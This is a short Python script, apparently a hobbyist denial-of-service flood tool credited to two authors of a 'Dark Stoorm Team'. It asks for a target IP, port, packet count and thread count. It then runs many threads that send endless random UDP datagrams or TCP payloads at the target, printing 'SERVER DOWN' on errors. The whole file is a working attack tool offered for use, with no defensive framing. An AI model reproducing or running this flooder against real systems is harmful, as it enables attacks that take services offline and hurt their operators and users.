import random
import socket
import threading

print("SCOTT")
print("""
    File by:
Rayen
X 
Jhony
 ᴅᴀʀᴋ ꜱᴛᴏᴏʀᴍ ᴛᴇᴀᴍ
 
 

 
 
 
Created by Rayen and jhony

""")
print("SCOTT")
ip= str(input(" Server ip :"))
port= int(input(" port :"))
choice = str(input(" DDoS Attack?? (y/n):"))
times= int(input(" Paket :"))
threads= int(input(" threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Rayen And Jhony")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" !RAYEN AND JHONY")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()